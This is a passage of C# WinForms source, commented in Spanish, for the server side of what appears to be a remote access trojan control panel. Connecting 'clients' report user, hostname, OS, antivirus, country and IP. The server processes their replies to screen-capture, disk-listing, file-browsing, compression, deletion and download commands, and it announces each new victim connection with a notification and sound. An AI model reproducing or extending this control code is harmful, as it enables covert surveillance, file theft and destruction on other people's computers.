                            Console.WriteLine($"✅ Archivos parseados: {archivos.Length} elementos");
                            
                            Console.WriteLine($"Información de archivos procesada para cliente {clientId}: {archivos.Length} elementos encontrados");
                            
                            // Mostrar notificación de éxito
                            this.Invoke((MethodInvoker)delegate
                            {
                                if (!this.IsDisposed && !this.Disposing)
                                {
                                    ShowNotification("Archivos Detectados", 
                                        $"Se detectaron {archivos.Length} elementos en el cliente {clientId}", 
                                        ToolTipIcon.Info);
                                    
                                    // Buscar y actualizar el formulario GestorArchivosClientesFT si está abierto
                                    Form gestorForm = Application.OpenForms.OfType<GestorArchivosClientesFT>()
                                        .FirstOrDefault(f => f.Text.Contains(clientId));
                                    
                                    if (gestorForm != null && gestorForm is GestorArchivosClientesFT gestorArchivos)
                                    {
                                        gestorArchivos.UpdateFilesFromClient(datosRecibidos);
                                        Console.WriteLine($"Formulario de gestor de archivos actualizado para cliente {clientId}");
                                    }
                                }
                            });
                        }
                        else
                        {
                            Console.WriteLine($"Error procesando información de archivos: {processedInfo}");
                            this.Invoke((MethodInvoker)delegate
                            {
                                if (!this.IsDisposed && !this.Disposing)
                                {
                                    ShowNotification("Error de Archivos", 
                                        $"Error procesando archivos del cliente {clientId}: {processedInfo}", 
                                        ToolTipIcon.Error);
                                }
                            });
                        }
                    }
                    finally
                    {
                        // Liberar el Mutex de explorador de archivos
                        clientAbrirDiscoMutex.ReleaseMutex();
                        Console.WriteLine($"Mutex de explorador de archivos liberado para cliente {clientId}");
                    }
                }
                else
                {
                    Console.WriteLine($"Timeout al adquirir Mutex de explorador de archivos para cliente {clientId}");
                    this.Invoke((MethodInvoker)delegate
                    {
                        if (!this.IsDisposed && !this.Disposing)
                        {
                            ShowNotification("Error de Archivos", 
                                $"Timeout al procesar archivos del cliente {clientId}", 
                                ToolTipIcon.Warning);
                        }
                    });
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando respuesta de archivos del cliente {clientId}: {ex.Message}");
                this.Invoke((MethodInvoker)delegate
                {
                    if (!this.IsDisposed && !this.Disposing)
                    {
                        ShowNotification("Error de Archivos", 
                            $"Error procesando archivos del cliente {clientId}: {ex.Message}", 
                            ToolTipIcon.Error);
                    }
                });
            }
        }

        private void ProcesarRespuestaCompresion(string datosRecibidos, string clientId)
                {
                    try
                    {
                // Obtener el mutex del cliente para compresión
                Mutex clientCompresionMutex = GetOrCreateClientCompresionMutex(clientId);
                
                Console.WriteLine($"🗜️ Procesando respuesta de compresión para cliente {clientId}");
                Console.WriteLine($"📊 Tamaño de datos: {datosRecibidos.Length} caracteres");
                Console.WriteLine($"📋 Primeros 100 chars: {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}");
                
                // Si tiene prefijo "COMPRIMIR:", removerlo
                string datosProcesar = datosRecibidos;
                if (datosRecibidos.StartsWith("COMPRIMIR:"))
                {
                    datosProcesar = datosRecibidos.Substring(10);
                    Console.WriteLine($"🗜️ Prefijo COMPRIMIR: removido, datos restantes: {datosProcesar.Length} caracteres");
                }
                
                // Intentar adquirir el mutex
                if (clientCompresionMutex.WaitOne(5000)) // Esperar máximo 5 segundos
                {
                    try
                    {
                        // Buscar el formulario de gestor de archivos del cliente
                        GestorArchivosClientesFT gestorForm = null;
                        lock (Application.OpenForms)
                        {
                            gestorForm = Application.OpenForms.OfType<GestorArchivosClientesFT>()
                                .FirstOrDefault(f => f.ClientId == clientId);
                        }
                        
                        if (gestorForm != null && !gestorForm.IsDisposed)
                        {
                            // Procesar la respuesta de compresión en el formulario
                            gestorForm.ProcessCompressionResponse(datosProcesar);
                            Console.WriteLine($"✅ Respuesta de compresión procesada para cliente {clientId}");
                        }
                        else
                        {
                            Console.WriteLine($"❌ Formulario de gestor de archivos no encontrado para cliente {clientId}");
                        }
                    }
                    finally
                    {
                        // Liberar el mutex
                        clientCompresionMutex.ReleaseMutex();
                        Console.WriteLine($"🔓 Mutex de compresión liberado para cliente {clientId}");
                    }
                }
                else
                {
                    Console.WriteLine($"⏰ Timeout esperando mutex de compresión para cliente {clientId}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error procesando respuesta de compresión: {ex.Message}");
            }
        }

        private void ProcesarRespuestaBorrado(string datosRecibidos, string clientId)
        {
            try
            {
                Console.WriteLine($"🗑️ Procesando respuesta de borrado para cliente {clientId}");
                Console.WriteLine($"📊 Tamaño de datos: {datosRecibidos.Length} caracteres");
                Console.WriteLine($"📋 Primeros 100 chars: {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}");
                
                // Si tiene prefijo "BORRAR:", removerlo
                string datosProcesar = datosRecibidos;
                if (datosRecibidos.StartsWith("BORRAR:"))
                {
                    datosProcesar = datosRecibidos.Substring(7);
                    Console.WriteLine($"🗑️ Prefijo BORRAR: removido, datos restantes: {datosProcesar.Length} caracteres");
                }
                
                // Buscar el formulario de gestor de archivos del cliente
                GestorArchivosClientesFT gestorForm = null;
                lock (Application.OpenForms)
                {
                    gestorForm = Application.OpenForms.OfType<GestorArchivosClientesFT>()
                        .FirstOrDefault(f => f.ClientId == clientId);
                }
                
                if (gestorForm != null && !gestorForm.IsDisposed)
                {
                    // Procesar la respuesta de borrado en el formulario
                    gestorForm.ProcessDeleteResponse(datosProcesar);
                    Console.WriteLine($"✅ Respuesta de borrado procesada para cliente {clientId}");
                }
                else
                {
                    Console.WriteLine($"❌ Formulario de gestor de archivos no encontrado para cliente {clientId}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error procesando respuesta de borrado: {ex.Message}");
            }
        }

        private void ProcesarRespuestaDescarga(string datosRecibidos, string clientId)
        {
            try
            {
                Console.WriteLine($"📥 Procesando respuesta de descarga para cliente {clientId}");
                Console.WriteLine($"📊 Tamaño de datos: {datosRecibidos.Length} caracteres");
                Console.WriteLine($"📋 Primeros 100 chars: {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}");
                
                // Si tiene prefijo "DESCARGAR:", removerlo
                string datosProcesar = datosRecibidos;
                if (datosRecibidos.StartsWith("DESCARGAR:"))
                {
                    datosProcesar = datosRecibidos.Substring(10);
                    Console.WriteLine($"📥 Prefijo DESCARGAR: removido, datos restantes: {datosProcesar.Length} caracteres");
                }
                
                // Buscar el formulario de gestor de archivos del cliente
                GestorArchivosClientesFT gestorForm = null;
                lock (Application.OpenForms)
                {
                    gestorForm = Application.OpenForms.OfType<GestorArchivosClientesFT>()
                        .FirstOrDefault(f => f.ClientId == clientId);
                }
                
                if (gestorForm != null && !gestorForm.IsDisposed)
                {
                    // Procesar la respuesta de descarga en el formulario
                    gestorForm.ProcessDownloadResponse(datosProcesar);
                    Console.WriteLine($"✅ Respuesta de descarga procesada para cliente {clientId}");
                }
                else
                {
                    Console.WriteLine($"❌ Formulario de gestor de archivos no encontrado para cliente {clientId}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error procesando respuesta de descarga: {ex.Message}");
            }
        }

        private void ProcesarRespuestaDiscos(string datosRecibidos, string clientId)
        {
            // Obtener o crear el Mutex de detección de discos para este cliente
            Mutex clientDiskMutex = GetOrCreateClientDiskMutex(clientId);
            
            try
            {
                Console.WriteLine($"Procesando respuesta de discos del cliente {clientId}");
                Console.WriteLine($"Longitud total de datos recibidos: {datosRecibidos.Length}");
                Console.WriteLine($"Datos recibidos (primeros 100 chars): {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}...");
                
                // Adquirir el Mutex de detección de discos para procesar la información de forma segura
                if (clientDiskMutex.WaitOne(5000)) // Esperar máximo 5 segundos
                {
                    try
                    {
                        Console.WriteLine($"Mutex de detección de discos adquirido para cliente {clientId}");
                        
                        // Procesar la información de discos usando DiskInfoProcessor
                        string processedInfo = DiskInfoProcessor.ProcesarDatosDiscosRecibidos(datosRecibidos);
                        
                        if (!processedInfo.StartsWith("ERROR:"))
                        {
                            // Parsear la información de discos
                            DiskInfo[] discos = DiskInfoProcessor.ParsearInformacionDiscos(processedInfo);
                            
                            Console.WriteLine($"Información de discos procesada para cliente {clientId}: {discos.Length} discos encontrados");
                            
                            // Mostrar notificación de éxito
                            this.Invoke((MethodInvoker)delegate
                            {
                                if (!this.IsDisposed && !this.Disposing)
                                {
                                    ShowNotification("Discos Detectados", 
                                        $"Se detectaron {discos.Length} discos en el cliente {clientId}", 
                                        ToolTipIcon.Info);
                                    
                                    // Buscar y actualizar el formulario GestorArchivosClientesFT si está abierto
                                    Form gestorForm = Application.OpenForms.OfType<GestorArchivosClientesFT>()
                                        .FirstOrDefault(f => f.Text.Contains(clientId));
                                    
                                    if (gestorForm != null && gestorForm is GestorArchivosClientesFT gestorArchivos)
                                    {
                                        gestorArchivos.UpdateDisksFromClient(datosRecibidos);
                                        Console.WriteLine($"Formulario de gestor de archivos actualizado para cliente {clientId}");
                                    }
                                }
                            });
                        }
                        else
                        {
                            Console.WriteLine($"Error procesando información de discos: {processedInfo}");
                            this.Invoke((MethodInvoker)delegate
                            {
                                if (!this.IsDisposed && !this.Disposing)
                                {
                                    ShowNotification("Error de Discos", 
                                        $"Error procesando discos del cliente {clientId}: {processedInfo}", 
                                        ToolTipIcon.Error);
                                }
                            });
                        }
                    }
                    finally
                    {
                        // Liberar el Mutex de detección de discos
                        clientDiskMutex.ReleaseMutex();
                        Console.WriteLine($"Mutex de detección de discos liberado para cliente {clientId}");
                    }
                }
                else
                {
                    Console.WriteLine($"Timeout al adquirir Mutex de detección de discos para cliente {clientId}");
                    this.Invoke((MethodInvoker)delegate
                    {
                        if (!this.IsDisposed && !this.Disposing)
                        {
                            ShowNotification("Error de Discos", 
                                $"Timeout al procesar discos del cliente {clientId}", 
                                ToolTipIcon.Warning);
                        }
                    });
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error procesando respuesta de discos del cliente {clientId}: {ex.Message}");
                this.Invoke((MethodInvoker)delegate
                {
                    if (!this.IsDisposed && !this.Disposing)
                    {
                        ShowNotification("Error de Discos", 
                            $"Error procesando discos del cliente {clientId}: {ex.Message}", 
                            ToolTipIcon.Error);
                    }
                });
            }
        }

        private Mutex GetOrCreateClientMutex(string clientId)
        {
            lock (ClienteMutexes)
            {
                if (!ClienteMutexes.ContainsKey(clientId))
                {
                    ClienteMutexes[clientId] = new Mutex(false, $"CaptureMutex_{clientId}");
                    Console.WriteLine($"Mutex creado para cliente {clientId}");
                }
                return ClienteMutexes[clientId];
            }
        }

        private void CleanupClientMutex(string clientId)
        {
            lock (ClienteMutexes)
            {
                if (ClienteMutexes.ContainsKey(clientId))
                {
                    try
                    {
                        ClienteMutexes[clientId].Dispose();
                        ClienteMutexes.Remove(clientId);
                        Console.WriteLine($"Mutex eliminado para cliente {clientId}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error eliminando Mutex del cliente {clientId}: {ex.Message}");
                    }
                }
            }
        }

        private Mutex GetOrCreateClientDiskMutex(string clientId)
        {
            lock (ClienteDiskMutexes)
            {
                if (!ClienteDiskMutexes.ContainsKey(clientId))
                {
                    ClienteDiskMutexes[clientId] = new Mutex(false, $"DiskDetectionMutex_{clientId}");
                    Console.WriteLine($"Mutex de detección de discos creado para cliente {clientId}");
                }
                return ClienteDiskMutexes[clientId];
            }
        }

        private void CleanupClientDiskMutex(string clientId)
        {
            lock (ClienteDiskMutexes)
            {
                if (ClienteDiskMutexes.ContainsKey(clientId))
                {
                    try
                    {
                        ClienteDiskMutexes[clientId].Dispose();
                        ClienteDiskMutexes.Remove(clientId);
                        Console.WriteLine($"Mutex de detección de discos eliminado para cliente {clientId}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error eliminando Mutex de detección de discos del cliente {clientId}: {ex.Message}");
                    }
                }
            }
        }

        private Mutex GetOrCreateClientAbrirDiscoMutex(string clientId)
        {
            lock (ClienteAbrirDiscoMutexes)
            {
                if (!ClienteAbrirDiscoMutexes.ContainsKey(clientId))
                {
                    ClienteAbrirDiscoMutexes[clientId] = new Mutex(false, $"AbrirDiscoMutex_{clientId}");
                    Console.WriteLine($"Mutex de explorador de archivos creado para cliente {clientId}");
                }
                return ClienteAbrirDiscoMutexes[clientId];
            }
        }

        private void CleanupClientAbrirDiscoMutex(string clientId)
        {
            lock (ClienteAbrirDiscoMutexes)
            {
                if (ClienteAbrirDiscoMutexes.ContainsKey(clientId))
                {
                    try
                    {
                        ClienteAbrirDiscoMutexes[clientId].Dispose();
                        ClienteAbrirDiscoMutexes.Remove(clientId);
                        Console.WriteLine($"Mutex de explorador de archivos eliminado para cliente {clientId}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error eliminando Mutex de explorador de archivos del cliente {clientId}: {ex.Message}");
                    }
                }
            }
        }

        private Mutex GetOrCreateClientCompresionMutex(string clientId)
        {
            lock (ClienteCompresionMutexes)
            {
                if (!ClienteCompresionMutexes.ContainsKey(clientId))
                {
                    ClienteCompresionMutexes[clientId] = new Mutex(false, $"CompresionMutex_{clientId}");
                    Console.WriteLine($"Mutex de compresión creado para cliente {clientId}");
                }
                return ClienteCompresionMutexes[clientId];
            }
        }

        private void CleanupClientCompresionMutex(string clientId)
        {
            lock (ClienteCompresionMutexes)
            {
                if (ClienteCompresionMutexes.ContainsKey(clientId))
                {
                    try
                    {
                        ClienteCompresionMutexes[clientId].Dispose();
                        ClienteCompresionMutexes.Remove(clientId);
                        Console.WriteLine($"Mutex de compresión eliminado para cliente {clientId}");
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Error eliminando Mutex de compresión del cliente {clientId}: {ex.Message}");
                    }
                }
            }
        }

        private byte[] DecompressData(byte[] compressedData)
        {
            using (MemoryStream compressedStream = new MemoryStream(compressedData))
            using (MemoryStream decompressedStream = new MemoryStream())
            {
                using (DeflateStream deflateStream = new DeflateStream(compressedStream, CompressionMode.Decompress))
                {
                    deflateStream.CopyTo(decompressedStream);
                }
                return decompressedStream.ToArray();
            }
        }

        private bool EsBase64Valido(string str)
        {
            try
            {
                // Verificar si la cadena es Base64 válida
                if (string.IsNullOrEmpty(str))
                    return false;
                
                // Verificar que solo contenga caracteres Base64 válidos
                foreach (char c in str)
                {
                    if (!((c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '+' || c == '/' || c == '='))
                    {
                        return false;
                    }
                }
                
                // Intentar decodificar para verificar que sea válido
                Convert.FromBase64String(str);
                return true;
            }
            catch
            {
                return false;
            }
        }

        private bool EsRespuestaCompresion(string datos)
        {
            try
            {
                // Verificar si es Base64 válido
                if (!EsBase64Valido(datos))
                    return false;
                
                // Verificar si no es muy corto (debe ser al menos 20 caracteres)
                if (datos.Length < 20)
                    return false;
                
                // Verificar si no contiene caracteres que indican otros comandos
                if (datos.Contains("DISCOS:") || datos.Contains("ABRIRDISCO:") || datos.Contains("CAP:"))
                    return false;
                
                // Verificar si parece ser una respuesta de compresión (Base64 comprimido)
                // Las respuestas de compresión suelen ser largas y solo contienen caracteres Base64
                if (datos.Length > 50 && EsBase64Valido(datos))
                {
                    // Intentar descomprimir para verificar
                    try
                    {
                        string descomprimido = CompressionResponseProcessor.ProcesarRespuestaCompresion(datos);
                        if (descomprimido.Contains("|") && descomprimido.Split('|').Length >= 7)
                        {
                            return true;
                        }
                    }
                    catch
                    {
                        // Si falla la descompresión, no es una respuesta de compresión
                        return false;
                    }
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }

        private bool EsRespuestaBorrado(string datos)
        {
            try
            {
                // Verificar si es Base64 válido
                if (!EsBase64Valido(datos))
                    return false;
                
                // Verificar si no es muy corto (debe ser al menos 20 caracteres)
                if (datos.Length < 20)
                    return false;
                
                // Verificar si no contiene caracteres que indican otros comandos
                if (datos.Contains("DISCOS:") || datos.Contains("ABRIRDISCO:") || datos.Contains("CAP:"))
                    return false;
                
                // Verificar si parece ser una respuesta de borrado (Base64 comprimido)
                // Las respuestas de borrado suelen ser largas y solo contienen caracteres Base64
                if (datos.Length > 50 && EsBase64Valido(datos))
                {
                    // Verificar si no es una respuesta de compresión
                    if (!EsRespuestaCompresion(datos))
                    {
                        // Si no es compresión y es Base64 válido, probablemente es borrado
                        return true;
                    }
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }

        private bool EsRespuestaDescarga(string datos)
        {
            try
            {
                // Verificar si es Base64 válido
                if (!EsBase64Valido(datos))
                    return false;
                
                // Verificar si no es muy corto (las descargas suelen ser más grandes)
                if (datos.Length < 100) // Aumentar el mínimo para descargas
                    return false;
                
                // Verificar si no contiene caracteres que indican otros comandos
                if (datos.Contains("DISCOS:") || datos.Contains("ABRIRDISCO:") || datos.Contains("CAP:"))
                    return false;
                
                // Verificar si parece ser una respuesta de descarga (Base64 comprimido)
                // Las descargas suelen ser muy largas y solo contienen caracteres Base64
                if (datos.Length > 1000 && EsBase64Valido(datos)) // Aumentar el mínimo para descargas
                {
                    // Verificar si no es una respuesta de compresión o borrado
                    if (!EsRespuestaCompresion(datos) && !EsRespuestaBorrado(datos))
                    {
                        // Si no es compresión ni borrado y es Base64 válido, probablemente es descarga
                        Console.WriteLine($"📥 Respuesta de descarga detectada por tamaño: {datos.Length} caracteres");
                        return true;
                    }
                }
                
                return false;
            }
            catch
            {
                return false;
            }
        }

        private void ManejarCliente(TcpClient cliente)
        {
            string clientId = null;
            bool infoRecibida = false; // Flag para saber si ya recibimos la información del sistema
            
            try
            {
                NetworkStream stream = cliente.GetStream();
                byte[] buffer = new byte[31457280]; // Buffer de 30MB para capturas
                
                while (cliente.Connected && isServerRunning)
                {
                    try
                    {
                        // Limpiar buffer antes de cada lectura
                        Array.Clear(buffer, 0, buffer.Length);
                        
                        int bytesRead = stream.Read(buffer, 0, buffer.Length);
                        if (bytesRead > 0)
                        {
                            // Actualizar contador de bytes recibidos
                            ActualizarBytesRecibidos(bytesRead);
                            
                            // Convertir bytes a string
                            string datosRecibidos = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                            
                            // Si aún no hemos recibido la información del sistema
                            if (!infoRecibida)
                            {
                                // Verificar si es información del sistema con prefijo "INFO:"
                                if (datosRecibidos.StartsWith("INFO:"))
                                {
                                    // Es información del sistema
                                    string infoData = datosRecibidos.Substring(5); // Remover "INFO:" prefix
                                    ProcesarInformacionCliente(infoData, cliente);
                                    
                                    // Extraer el ID del cliente para el mapeo
                                    try
                                    {
                                        PaqueteInformacionReceptor paquete = new PaqueteInformacionReceptor(infoData);
                                        if (paquete.EsValido())
                                        {
                                            clientId = paquete.Id;
                                            // Agregar al mapeo
                                            lock (ClienteMapping)
                                            {
                                                ClienteMapping[clientId] = cliente;
                                            }
                                            Console.WriteLine($"Cliente {clientId} agregado al mapeo");
                                            infoRecibida = true; // Marcar que ya recibimos la información
                                        }
                                    }
                                    catch (Exception ex)
                                    {
                                        Console.WriteLine($"Error extrayendo ID del cliente: {ex.Message}");
                                    }
                                }
                                else
                                {
                                    // No es información del sistema, ignorar estos datos
                                    Console.WriteLine("Datos recibidos que no son información del sistema, ignorando...");
                                }
                            }
                            else
                            {
                                // Ya recibimos la información del sistema, estos datos pueden ser respuestas a comandos
                                if (datosRecibidos.StartsWith("CAP:"))
                                {
                                    // Es una respuesta de captura de pantalla completa
                                    Console.WriteLine($"Captura completa recibida del cliente {clientId}");
                                    ProcesarRespuestaCaptura(datosRecibidos, clientId);
                                }
                                else if (datosRecibidos.StartsWith("DISCOS:"))
                                {
                                    // Es una respuesta de detección de discos
                                    Console.WriteLine($"Información de discos recibida del cliente {clientId}");
                                    ProcesarRespuestaDiscos(datosRecibidos, clientId);
                                }
                                else if (datosRecibidos.StartsWith("ABRIRDISCO:"))
                                {
                                    // Es una respuesta de explorador de archivos
                                    Console.WriteLine($"🎯 ABRIRDISCO detectado - Cliente: {clientId}");
                                    Console.WriteLine($"📊 Tamaño de datos: {datosRecibidos.Length} caracteres");
                                    Console.WriteLine($"📋 Primeros 100 chars: {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}");
                                    ProcesarRespuestaAbrirDisco(datosRecibidos, clientId);
                                }
                                else if (datosRecibidos.StartsWith("COMPRIMIR:"))
                                {
                                    // Es una respuesta de compresión
                                    Console.WriteLine($"🗜️ COMPRIMIR detectado - Cliente: {clientId}");
                                    Console.WriteLine($"📊 Tamaño de datos: {datosRecibidos.Length} caracteres");
                                    Console.WriteLine($"📋 Primeros 100 chars: {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}");
                                    ProcesarRespuestaCompresion(datosRecibidos, clientId);
                                }
                                else if (EsRespuestaCompresion(datosRecibidos))
                                {
                                    // Es una respuesta de compresión (sin prefijo)
                                    Console.WriteLine($"🗜️ Respuesta de compresión detectada - Cliente: {clientId}");
                                    Console.WriteLine($"📊 Tamaño de datos: {datosRecibidos.Length} caracteres");
                                    Console.WriteLine($"📋 Primeros 100 chars: {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}");
                                    ProcesarRespuestaCompresion(datosRecibidos, clientId);
                                }
                                        else if (EsRespuestaBorrado(datosRecibidos))
        {
            // Es una respuesta de borrado (sin prefijo)
            Console.WriteLine($"🗑️ Respuesta de borrado detectada - Cliente: {clientId}");
            Console.WriteLine($"📊 Tamaño de datos: {datosRecibidos.Length} caracteres");
            Console.WriteLine($"📋 Primeros 100 chars: {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}");
            ProcesarRespuestaBorrado(datosRecibidos, clientId);
        }
        else if (datosRecibidos.StartsWith("DESCARGAR:"))
        {
            // Es una respuesta de descarga con prefijo
            Console.WriteLine($"📥 Respuesta de descarga detectada (con prefijo) - Cliente: {clientId}");
            Console.WriteLine($"📊 Tamaño de datos: {datosRecibidos.Length} caracteres");
            string datosProcesar = datosRecibidos.Substring(10); // Remover "DESCARGAR:" prefix
            Console.WriteLine($"📊 Datos sin prefijo: {datosProcesar.Length} caracteres");
            
            try
            {
                ProcesarRespuestaDescarga(datosProcesar, clientId);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error procesando respuesta de descarga: {ex.Message}");
            }
        }
        else if (EsRespuestaDescarga(datosRecibidos))
        {
            // Es una respuesta de descarga (sin prefijo)
            Console.WriteLine($"📥 Respuesta de descarga detectada - Cliente: {clientId}");
            Console.WriteLine($"📊 Tamaño de datos: {datosRecibidos.Length} caracteres");
            Console.WriteLine($"📋 Primeros 100 chars: {datosRecibidos.Substring(0, Math.Min(100, datosRecibidos.Length))}");
            
            try
            {
                ProcesarRespuestaDescarga(datosRecibidos, clientId);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"❌ Error procesando respuesta de descarga: {ex.Message}");
            }
        }
                                else
                                {
                                    Console.WriteLine($"Datos recibidos del cliente {clientId}: {datosRecibidos.Substring(0, Math.Min(50, datosRecibidos.Length))}...");
                                }
                            }
                        }
                        else
                        {
                            // Cliente desconectado
                            break;
                        }
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error leyendo datos del cliente: {ex.Message}");
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
               Console.WriteLine($"Error manejando cliente: {ex.Message}");
            }
                    finally
                    {
                // Remover cliente de las listas
                lock (ClientesConectados)
                {
                    ClientesConectados.Remove(cliente);
                }
                
                // Remover del mapeo (buscar por TcpClient)
                lock (ClienteMapping)
                {
                    var keysToRemove = ClienteMapping.Where(kvp => kvp.Value == cliente).Select(kvp => kvp.Key).ToList();
                    foreach (var key in keysToRemove)
                    {
                        ClienteMapping.Remove(key);
                        Console.WriteLine($"Cliente {key} removido del mapeo");
                        
                        // Limpiar los Mutex del cliente
                        CleanupClientMutex(key);
                        CleanupClientDiskMutex(key);
                        CleanupClientAbrirDiscoMutex(key);
                        CleanupClientCompresionMutex(key);
                    }
                }
                
                try
                {
                    cliente.Close();
                    cliente.Dispose();
                    
                    // Mostrar notificación de cliente desconectado
                    this.Invoke((MethodInvoker)delegate
                    {
                        if (!this.IsDisposed && !this.Disposing)
                        {
                            ShowNotification("Cliente Desconectado", 
                                "Un cliente se ha desconectado del servidor", 
                                ToolTipIcon.Warning);
                        }
                    });
                }
                catch { }
            }
        }

        private void ProcesarInformacionCliente(string datosRecibidos, TcpClient cliente)
        {
            try
            {
                // Verificar que los datos sean Base64 válidos
                if (!EsBase64Valido(datosRecibidos))
                {
                    Console.WriteLine("Datos recibidos no son Base64 válidos, ignorando...");
                    return;
                }
                
                Console.WriteLine($"Datos recibidos (Base64): {datosRecibidos}");
                    
                // Crear paquete receptor y procesar datos
                PaqueteInformacionReceptor paquete = new PaqueteInformacionReceptor(datosRecibidos);
                    
                   Console.WriteLine($"Paquete procesado: {paquete.ToString()}");
                   Console.WriteLine($"Paquete válido: {paquete.EsValido()}");
                   Console.WriteLine($"Detalles del paquete:");
                   Console.WriteLine($"  ID: {paquete.Id}");
                   Console.WriteLine($"  User: {paquete.User}");
                   Console.WriteLine($"  Hostname: {paquete.Hostname}");
                   Console.WriteLine($"  SystemOS: {paquete.SystemOS}");
                   Console.WriteLine($"  AV: {paquete.AV}");
                   Console.WriteLine($"  País: {paquete.Pais}");
                   Console.WriteLine($"  IP: {paquete.IP}");
                   Console.WriteLine($"  Arch: {paquete.Arch}");
                
                if (paquete.EsValido())
                {
                    // Guardar información del cliente
                    lock (InformacionClientes)
                    {
                        InformacionClientes[paquete.Id] = paquete;
                    }
                    
                    // Agregar mapeo de cliente
                    lock (ClienteMapping)
                    {
                        ClienteMapping[paquete.Id] = cliente;
                    }
                   Console.WriteLine($"Cliente {paquete.Id} agregado al mapeo");
                    
                   Console.WriteLine($"Cliente guardado en diccionario. Total clientes: {InformacionClientes.Count}");
                    
                    // Actualizar la interfaz de usuario
                    this.Invoke((MethodInvoker)delegate
                    {
                        if (!this.IsDisposed && !this.Disposing)
                        {
                           Console.WriteLine("Actualizando lista de clientes en UI...");
                            
                            // Reproducir sonido de conexión
                            ReproducirSonidoConexion();
                            
                            // Si es el primer cliente, mostrar la lista automáticamente
                            if (InformacionClientes.Count == 1)
                            {
                               Console.WriteLine("Primer cliente conectado, mostrando lista...");
                                ShowClientesList();
                            }
                            
                            ActualizarListaClientes(paquete);
                        }
                    });
                    
                   Console.WriteLine($"Información procesada: {paquete.ToString()}");
                }
                else
                {
                   Console.WriteLine("Paquete no válido, no se procesará");
                }
            }
            catch (Exception ex)
            {
               Console.WriteLine($"Error procesando información del cliente: {ex.Message}");
               Console.WriteLine($"StackTrace: {ex.StackTrace}");
            }
        }

        private void ActualizarListaClientes(PaqueteInformacionReceptor paquete)
        {
            try
            {
                if (listaClientesForm != null && !listaClientesForm.IsDisposed)
                {
                    // Verificar si el cliente ya existe en la lista visual
                    bool clienteExiste = false;
                    
                    // Buscar en las tarjetas existentes
                    foreach (var card in listaClientesForm.FlowLayoutPanel.Controls)
                    {
                        if (card is AnimatedCard animatedCard)
                        {
                            // Verificar si la tarjeta tiene el mismo ID usando la propiedad pública
                            if (animatedCard.ClientId == paquete.Id)
                            {
                                clienteExiste = true;
                                break;
                            }
                        }
                    }
                    
                    if (clienteExiste)
                    {
                        // Actualizar cliente existente
                        listaClientesForm.ActualizarCliente(
                            paquete.Id, 
                            paquete.User, 
                            paquete.Hostname, 
                            paquete.IP, 
                            paquete.Pais, 
                            paquete.Arch, 
                            paquete.SystemOS, 
                            "Desktop", // Tipo de máquina por defecto
                            paquete.AV // Antivirus
                        );
                        
                       Console.WriteLine($"Cliente actualizado: {paquete.ToString()}");
                    }
                    else
                    {
                        // Agregar nuevo cliente
                        listaClientesForm.AgregarCliente(
                            paquete.Id, 
                            paquete.User, 
                            paquete.Hostname, 
                            paquete.IP, 
                            paquete.Pais, 
                            paquete.Arch, 
                            paquete.SystemOS, 
                            "Desktop", // Tipo de máquina por defecto
                            paquete.AV // Antivirus
                        );
                        
                                                   Console.WriteLine($"Nuevo cliente agregado: {paquete.ToString()}");
                            
                            // Mostrar notificación de nuevo cliente
                            ShowNotification("Nuevo Cliente", 
                                $"Cliente {paquete.Id} ({paquete.User}@{paquete.Hostname}) conectado", 
                                ToolTipIcon.Info);
                    }
                }
            }
            catch (Exception ex)
            {
               Console.WriteLine($"Error actualizando lista de clientes: {ex.Message}");
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            try
            {
               Console.WriteLine("Iniciando cierre seguro del servidor...");
                
                // Marcar que el servidor debe detenerse
                isServerRunning = false;
                
                // Detener el servidor TCP inmediatamente
                if (Servidor != null)
                {
                    try
                    {
                       Console.WriteLine("Deteniendo servidor TCP...");
                        Servidor.Stop();
                        Servidor = null;
                       Console.WriteLine("Servidor TCP detenido");
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error deteniendo servidor TCP: {ex.Message}");
                    }
                }
                
                // Cerrar todas las conexiones de clientes de forma asíncrona
                Task.Run(() =>
                {
                    try
                    {
                        lock (ClientesConectados)
                        {
                           Console.WriteLine($"Cerrando {ClientesConectados.Count} conexiones de clientes...");
                            foreach (var cliente in ClientesConectados.ToList())
                            {
                                try
                                {
                                    if (cliente.Connected)
                                    {
                                        cliente.Close();
                                    }
                                    cliente.Dispose();
                                }
                                catch (Exception ex)
                                {
                                   Console.WriteLine($"Error cerrando cliente: {ex.Message}");
                                }
                            }
                            ClientesConectados.Clear();
                        }
                    }
                    catch (Exception ex)
                    {
                       Console.WriteLine($"Error en cierre de clientes: {ex.Message}");
                    }
                });
                
                // Detener hilos de forma asíncrona con timeout
                Task.Run(() =>
                {
                    try
                    {
                        lock (HilosClientes)
                        {
                           Console.WriteLine($"Deteniendo {HilosClientes.Count} hilos de clientes...");
                            foreach (var hilo in HilosClientes.ToList())
                            {
                                try
                                {
                                    if (hilo.IsAlive)
                                    {
                                        // Usar timeout más corto para evitar bloqueos
